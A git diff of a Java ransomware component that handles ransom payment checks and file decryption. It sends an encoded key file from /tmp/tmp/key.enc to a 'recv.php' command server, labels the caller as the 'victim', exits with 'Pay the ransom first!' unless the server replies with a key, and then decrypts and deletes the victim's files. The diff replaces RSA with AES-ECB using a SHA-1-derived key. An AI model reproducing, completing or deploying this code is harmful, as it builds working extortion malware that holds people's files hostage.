@@ -1,7 +1,6 @@
 import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileWriter;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
@@ -9,47 +8,57 @@ import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.security.KeyFactory;
-import java.security.KeyPair;
-import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
-import java.security.PrivateKey;
-import java.security.spec.PKCS8EncodedKeySpec;
 import java.util.ArrayList;
+import java.io.FileOutputStream;
 import java.util.Base64;
 import java.util.List;
 import java.util.stream.Stream;
 import javax.crypto.Cipher;
-import java.security.spec.InvalidKeySpecException;
+import javax.crypto.spec.SecretKeySpec;
+import java.util.Arrays;
+import java.security.MessageDigest;
+import java.io.UnsupportedEncodingException;
 
 class secret {
-	KeyPair secret(){
-		KeyPairGenerator kpg = null;
+	private static byte[] key;
+	private static SecretKeySpec secretKey;
+	void setKey(String myKey){
+		MessageDigest sha = null;
 		try{
-			kpg = KeyPairGenerator.getInstance("RSA");
-		} catch (NoSuchAlgorithmException e) {
-			throw new RuntimeException(e);
+			key = myKey.getBytes("UTF-8");
+			sha = MessageDigest.getInstance("SHA-1");
+			key = sha.digest(key);
+			key = Arrays.copyOf(key, 16);
+			secretKey = new SecretKeySpec(key, "AES");
 		}
-		kpg.initialize(2048);
-		KeyPair kp = kpg.generateKeyPair();
-		return kp;
+		catch (NoSuchAlgorithmException e){
+			e.printStackTrace();
+		}
+		catch (UnsupportedEncodingException e){
+			e.printStackTrace();
+		}
 	}
-	void decryptFiles(int cipherMode,PrivateKey pKey,String inputFile,String outputFile) throws Exception{
-		Cipher cipher = Cipher.getInstance("RSA");
-		cipher.init(Cipher.DECRYPT_MODE, pKey);
-		String textString = "";
-		textString = new String(Files.readAllBytes(Paths.get(inputFile)));
-		byte[] rawData = Base64.getDecoder().decode(textString.getBytes());
+	void decryptFiles(int cipherMode,String key,String inputFile,String outputFile) throws Exception{
+		setKey(key);
+		Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+		cipher.init(Cipher.DECRYPT_MODE, secretKey);
+		byte[] textString ;
+		textString = Files.readAllBytes(Paths.get(inputFile));
+		byte[] rawData = textString;
 		byte[] plainText = cipher.doFinal(rawData);
-		BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));
-		String plainStringText = new String(plainText); 
-		writer.write(plainStringText);
-		writer.close();
+		FileOutputStream fileOutputStream = null;
+		try{
+			fileOutputStream = new FileOutputStream(outputFile);
+			fileOutputStream.write(plainText);
+		}catch (IOException e){
+			throw new IOException(e);
+		}
 	}
 }
 
 class RansomwareDeactivate{
-	void decryptAllFiles(PrivateKey privKey) throws IOException{
+	void decryptAllFiles(String key) throws IOException{
 		secret sec = new secret();
 		List<Path> fileNames = new ArrayList<Path>();
 		try{
@@ -64,7 +73,7 @@ class RansomwareDeactivate{
 				System.out.println("Decrypting file: "+file.toString());
 				String inputFile = file.toString();
 				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
-				sec.decryptFiles(Cipher.DECRYPT_MODE, privKey, inputFile,outputFile);
+				sec.decryptFiles(Cipher.DECRYPT_MODE, key, inputFile,outputFile);
 				File f = new File(inputFile);
 				f.delete();
 			}
@@ -76,30 +85,30 @@ class RansomwareDeactivate{
 }
 
 class decrypt {
-	static private String[] result;
-	static void activate() throws IOException{
-		String privKey = result[1].replaceAll("-","").replaceAll("BEGIN PRIVATE KEY","").replaceAll("END PRIVATE KEY","");
-		byte[] privateBytes = Base64.getDecoder().decode(privKey);
-		PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(privateBytes);
-		try{
-			KeyFactory keyFactory = KeyFactory.getInstance("RSA");
-			PrivateKey privateKey = keyFactory.generatePrivate(keySpec);
-			RansomwareDeactivate ransomware  = new RansomwareDeactivate();
-			ransomware.decryptAllFiles(privateKey);
-		}
-		catch (InvalidKeySpecException | NoSuchAlgorithmException e){
-			throw new RuntimeException(e);
-		}
+	static void activate(String ans) throws IOException{
+			RansomwareDeactivate ransomware = new RansomwareDeactivate();
+			ransomware.decryptAllFiles(ans);
 	}
-
-	//Function to warn user telling them only 3 clicks availble to Decrypt Button to decrease server load
-	//void threat(){		
-	//}
 
 	static void validatePayment() throws IOException{
 		//ID is the victim's ID
 		int id = 1;
-		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+id);
+		File file = new File("/tmp/tmp/key.enc");
+		String encoded_key = "";
+		String modifiedKey = "";
+		try{
+			byte[] encKey = Files.readAllBytes(file.toPath());
+			encoded_key = Base64.getEncoder().encodeToString(encKey).toString();
+			//System.out.println(encoded_key);
+			modifiedKey = encoded_key.replace('+', '-');
+		}
+		catch (FileNotFoundException e){
+			e.printStackTrace();
+		}
+		catch (IOException e){
+			e.printStackTrace();
+		}
+		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+id);
 		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
 		con.setRequestMethod("GET");
 		con.addRequestProperty("Victim", "Yes");
@@ -111,18 +120,19 @@ class decrypt {
 		}
 		in.close();
 		String ans  =response.toString();
-		result = ans.split("@",2);
-		System.out.println(result[0]);
-		if(result[0] == "Yes"){
-			//activate();
-			System.out.println("Decrypting files!");
+		System.out.println(ans);
+		if(ans.equals("Pay the ransom")){
+			System.out.println("Pay the ransom first!");
+			System.exit(0);
 		}
-		//Implement in future release
-		//else{
-		//	threat();
-		//}
+		else
+		{
+			activate(ans);
+		}
 	}
 	public static void main(String[] args) throws IOException{
 		validatePayment();
+		File f = new File("/tmp/tmp/key.enc");
+		f.delete();
 	}
 }
